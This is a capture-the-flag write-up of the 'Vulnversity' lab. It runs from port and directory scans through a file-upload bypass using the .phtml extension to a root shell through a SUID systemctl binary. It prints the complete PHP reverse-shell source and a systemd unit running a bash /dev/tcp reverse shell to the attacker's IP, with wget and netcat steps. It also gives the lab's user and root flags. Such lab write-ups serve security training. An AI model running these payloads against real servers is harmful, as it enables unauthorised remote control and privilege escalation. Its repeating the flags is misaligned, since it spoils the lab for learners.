
## 0. **Lab infos**

**Difficulty :** #easy 
**Name :** Vulnversity
**IP** : 10.10.216.247
**Objectives :** Answer all the questions and get the user and root flag
**OS :** ?

##### **Conclusion**
**Time :** 1h27
	**Start :** 04/05/2025 16:35
	**Break at/to :** 
	**Finish :** 04/05/2025 18:02
**Satisfaction :** 8/10
## 1. **Reconnaissance**

We start with an #nmap scan :

```BASH
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
```


And now a gobuster scan :

```BASH
root@ip-10-10-16-93:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.216.247:3333 -x html,php,txt,py,log,conf,db
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.247:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,py,log,conf,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 295]
/index.html           (Status: 200) [Size: 33014]
/.php                 (Status: 403) [Size: 294]
/images               (Status: 301) [Size: 322] [--> http://10.10.216.247:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.216.247:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.216.247:3333/js/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.216.247:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.216.247:3333/internal/]
Progress: 731339 / 1746208 (41.88%)
```

![[Pasted image 20250504165126.png]]


## 2. **Weaponization**

phpRCE :

```PHP
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.93';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

## 3. **Delivery**

## 4. **Exploitation**

Now We will fuzz the upload form to identify which extensions are not blocked.

```BASH
root@ip-10-10-16-93:~# cat phphext.txt 
.php
.php3
.php4
.php5
.phtml
```

![[Pasted image 20250504170024.png]]

We fuzz with #burpsuite

The extension name .phtml show us a success. We can now install an #RCE 
## 5. **Installation**

Now our #RCE is good we can access to it at `http://10.10.216.247:3333/internal/uploads/rce.phtml`

## 6. **Command and Control**

We are actually www-data and we want to be root. So we search for all the files with the SUID byte. `find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null | sort -k 3`

```BASH
-rwsr-xr-- 1 root messagebus  42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root        14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root        23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root        27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root        30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root        32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root        32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root        35600 Mar  6  2017 /sbin/mount.cifs
-rwsr-xr-x 1 root root        38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root        39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root        40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root        40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root        40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root        44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root        44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root        49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root        54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root        75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-sr-x 1 root $ root        98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root       136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root       142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root       428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root       659856 Feb 13  2019 /bin/systemctl
```

We can use systemctl for create a root shell.

First 

Attacker
```BASH
root@ip-10-10-16-93:~# cat root.service
echo '[Unit]
Description=Get Root Shell

[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.16.93/4444 0>&1"

[Install]
WantedBy=multi-user.target' > /tmp/root.service
root@ip-10-10-16-93:~# python3 -m http.server 3333
```


After

Victim
```BASH
$ wget http://10.10.16.93:3333/root.service
--2025-05-04 11:53:37--  http://10.10.16.93:3333/root.service
Connecting to 10.10.16.93:3333... connected.
HTTP request sent, awaiting response... 200 OK
Length: 190 [application/octet-stream]
Saving to: 'root.service'

     0K                                                       100% 46.9M=0s

2025-05-04 11:53:37 (46.9 MB/s) - 'root.service' saved [190/190]

$ ls
root.service
rootshell.c
rt1747.service
rt1898.service
rtNxeP.service
rtaUYr.service
systemd-private-69646fbfe5ec44fc8f9655de3c4eb0ee-systemd-timesyncd.service-oyLOLg
$ systemctl enable /tmp/root.service
Failed to execute operation: Invalid argument
```

Second after

Attacker
```BASH
root@ip-10-10-16-93:~# nc -nlvp 4444
```


End

Victim
```BASH
$ systemctl start root
```


And here we are :

```BASH
root@ip-10-10-16-93:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.216.247 56740
bash: cannot set terminal process group (2099): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# ls
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
root@vulnuniversity:/# whoami
whoami
root
root@vulnuniversity:/# 
```

## 7. **Actions on Objectives**

user flag :

```BASH
$ cd home
$ ls
bill
$ cd bill
$ ls
user.txt
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```


root flag :

```BASH
root@vulnuniversity:/# cd root
cd root
root@vulnuniversity:/root# ls
ls
root.txt
root@vulnuniversity:/root# cat root.txt	
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
root@vulnuniversity:/root# 
```